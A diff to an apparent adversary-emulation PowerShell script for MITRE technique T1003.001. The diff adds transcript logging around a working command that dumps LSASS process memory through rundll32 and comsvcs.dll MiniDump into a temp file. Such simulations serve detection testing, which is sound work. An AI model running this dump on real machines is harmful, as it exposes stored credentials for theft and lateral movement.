@@ -2,7 +2,11 @@
     T1003.001 - OS Credential Dumping: LSASS Memory
     Dumping lsass process using built-in windows option 
 #>
+
+Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append
+
 $dmpPath = "$env:TEMP\lsass.dmp"
+
 rundll32.exe $env:windir\System32\comsvcs.dll, MiniDump (ps -Name lsass).id $dmpPath full
 
 if (Test-Path $dmpPath) {
@@ -10,3 +14,6 @@ if (Test-Path $dmpPath) {
 } else {
     Write-Host "Error: $dmpPath has not been created"
 }
+
+
+Stop-Transcript
